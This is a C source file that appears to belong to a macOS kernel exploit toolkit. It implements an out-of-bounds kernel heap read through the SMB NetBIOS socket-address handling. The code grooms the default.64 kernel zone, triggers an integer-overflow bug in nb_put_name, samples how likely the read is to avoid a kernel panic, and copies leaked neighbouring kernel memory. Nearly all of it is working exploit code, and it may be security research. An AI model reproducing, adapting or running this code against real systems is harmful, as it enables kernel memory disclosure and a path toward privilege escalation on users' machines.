//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xpl/util/log.h>
#include <xpl/util/assert.h>
#include <xpl/util/dispatch.h>
#include <xpl/util/binary.h>
#include <xpl/util/misc.h>

#include <macos/kernel.h>

#include "oob_reader_ovf.h"
#include "oob_reader_base.h"
#include "allocator_nrnw.h"

#include "../smb/client.h"

///
/// Uses module `xpl_oob_reader_base.c` to provide safe OOB read from zones in `KHEAP_KEXT`
/// with element size greater than 32
///

#define MAX_TRIES 25

#define NUM_SAMPLES_FOR_PROBABILITY 100
#define CUTOFF_PROBABILITY 0.95
#define NUM_KEXT_64_PAD_START_PAGES 32
#define NUM_KEXT_64_ELEMENTS_PER_GAP 7
#define NUM_KEXT_64_READ_SLOTS (xpl_PAGE_SIZE / 64 * 64)
#define NUM_KEXT_64_FRAGMENTED_PAGES 64
#define NUM_KEXT_64_PAD_END_PAGES 8


xpl_allocator_nrnw_t xpl_oob_reader_ovf_fragment_default_64(const struct sockaddr_in* smb_addr) {
    /// The allocations made by `xpl_allocator_nrnw` are made on zones from `KHEAP_KEXT`
    /// As of macOS 12.3, both `KHEAP_DEFAULT` and `KHEAP_KEXT` uses same zones.
    /// So these allocations will be done on default.64 zone
    xpl_allocator_nrnw_t gap_allocator = xpl_allocator_nrnw_create(smb_addr);
    xpl_allocator_nrnw_t element_allocator = xpl_allocator_nrnw_create(smb_addr);
    
    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * xpl_PAGE_SIZE / 64);
    for (int i=0; i<NUM_KEXT_64_READ_SLOTS; i++) {
        xpl_allocator_nrnw_allocate(gap_allocator, 64, 1);
        xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_ELEMENTS_PER_GAP);
    }
    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * xpl_PAGE_SIZE / 64);
    
    xpl_allocator_nrnw_destroy(&gap_allocator);
    return element_allocator;
}


float xpl_oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
    /// Number of elements in default.64 that would be overwritten due to OOB write when
    /// performing OOB read with overflow
    int num_overwritten = ((int)addr_len - 1) / 64;
    
    int total_size = (num_overwritten + 1) * 64;
    /// Length of netbios name first segment data required to read all the overwritten elements
    /// in default.64
    uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
    xpl_assert_cond(total_size, <=, UINT8_MAX);
    
    uint32_t* local_nb_name_size = alloca(sizeof(uint32_t));
    *local_nb_name_size = 2048;
    char* local_nb_name = malloc(*local_nb_name_size);
    
    int num_safe_ovfs = 0;
    for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
        dispatch_async(xpl_dispatch_queue(), ^() {
            struct xpl_oob_reader_base_args params;
            params.smb_addr = *smb_addr;
            /// Not using server socket address for OOB read
            params.saddr_snb_len = sizeof(struct sockaddr_nb);
            params.saddr_ioc_len = sizeof(struct sockaddr_nb);
            params.saddr_snb_name_seglen = 3;
            static_assert(sizeof(struct sockaddr_nb) > 48 && sizeof(struct sockaddr_nb) <= 64, "");
            /// `snb_len` set to 64 so that OOB write will not happen
            params.laddr_snb_len = 64;
            params.laddr_ioc_len = zone_size;
            params.laddr_snb_name_seglen = to_read;
            
            xpl_oob_reader_base_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
            dispatch_semaphore_signal(sem);
        });
        
        /// Due to the integer overflow in `nb_put_name` method, if any of the netbios
        /// segment data length is 255, then `nb_put_name` method will never return
        /// Detect this condition and stop waiting if this happens.
        /// See `poc_snb_name_oob_read` for more details
        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * 1000000000ULL))) {
            xpl_log_error("kmem neighbor read timed out, restart the xpl_smbx server, kill the xpl_kmem process and try again");
            xpl_abort();
        }
        
        xpl_assert_cond(*local_nb_name_size, >=, to_read + 1);
        
        uint8_t first_segment_size = local_nb_name[0];
        xpl_assert_cond(first_segment_size, ==, to_read);
        
        int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
        
        _Bool is_safe_ovf = TRUE;
        /// Check data of each overwritten default.64 zone element and see if they match
        /// with safe allocations of `xpl_oob_reader_ovf_fragment_default_64`
        for (int i=0; i<num_overwritten; i++) {
            struct sockaddr_in in;
            memcpy(&in, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_in));
            if (in.sin_len != 64 || in.sin_family != ALLOCATOR_NRNW_SOCK_ADDR_FAMILY || in.sin_port != ALLOCATOR_NRNW_SOCK_ADDR_PORT) {
                is_safe_ovf = FALSE;
                break;
            }
        }
        
        if (is_safe_ovf) {
            num_safe_ovfs++;
        }
    }
    
    free(local_nb_name);
    return (float)num_safe_ovfs / (float)NUM_SAMPLES_FOR_PROBABILITY;
}

int xpl_oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
    xpl_assert_cond(data_size, <=, zone_size);
//    xpl_assert_cond(zone_size, >=, 64);
    xpl_assert_cond(zone_size, <, 128);
    
    /// Fragment the default.64 zone. The allocations used for fragmenting the zone are
    /// of `struct sockaddr` type. OOB writes to these allocations are safe.
    xpl_allocator_nrnw_t element_allocator = xpl_oob_reader_ovf_fragment_default_64(smb_addr);
    
    int error = EAGAIN;
    for (int i=0; i<MAX_TRIES; i++) {
        /// Perform test OOB read on default.64 zones without overflow write to see if
        /// OOB reads requiring overflow may cause kernel panic
        double probability = xpl_oob_reader_ovf_check(smb_addr, zone_size, zone_size * 2);
        if (probability < CUTOFF_PROBABILITY) {
            xpl_log_debug("skipping OOB read (with ovf) attempt %d due to low success probability of %.2f", i, probability);
            continue;
        }
                
        uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
        
        struct xpl_oob_reader_base_args params;
        params.smb_addr = *smb_addr;
        
        /// Server socket address not used to perform OOB read
        params.saddr_ioc_len = sizeof(struct sockaddr_nb);
        params.saddr_snb_len = sizeof(struct sockaddr_nb);
        params.saddr_snb_name_seglen = 3;
        
        /// Only local socket address is used to perform OOB read
        params.laddr_ioc_len = zone_size;
        params.laddr_snb_len = zone_size * 2;
        params.laddr_snb_name_seglen = snb_name_seglen;
        
        /// Buffer for reading the local netbios name received by xpl_smbx server
        uint32_t local_nb_name_size = 2048;
        char* local_nb_name = malloc(local_nb_name_size);
        
        xpl_oob_reader_base_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
        xpl_assert_cond(local_nb_name_size, >=, snb_name_seglen);
        
        uint8_t first_segment_len = local_nb_name[0];
        xpl_assert_cond(first_segment_len, ==, snb_name_seglen);
        
        /// Skip data from memory allocated for the socket address
        int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
        xpl_log_debug_hexdump(&local_nb_name[bytes_to_skip], data_size, "neighbor data: ");
        memcpy(data, &local_nb_name[bytes_to_skip], data_size);
        
        free(local_nb_name);
        error = 0;
        break;
    }
    
    xpl_allocator_nrnw_destroy(&element_allocator);
    return error;
}

int xpl_oob_reader_ovf_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
    dispatch_queue_t queue = dispatch_queue_create("reader", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, DISPATCH_QUEUE_PRIORITY_HIGH));

    volatile _Bool* stop = alloca(sizeof(_Bool));
    *stop = FALSE;
    int* res = alloca(sizeof(int));
    dispatch_apply(xpl_cpu_count(), queue, ^(size_t index) {
        if (index == 0) {
            xpl_sleep_ms(10);
            *res = xpl_oob_reader_ovf_read_internal(smb_addr, zone_size, data, data_size);
            *stop = TRUE;
        } else {
            /// Reduce effect of other processes on kernel heap
            while (!*stop) {}
        }
    });

    dispatch_release(queue);
    return *res;
}

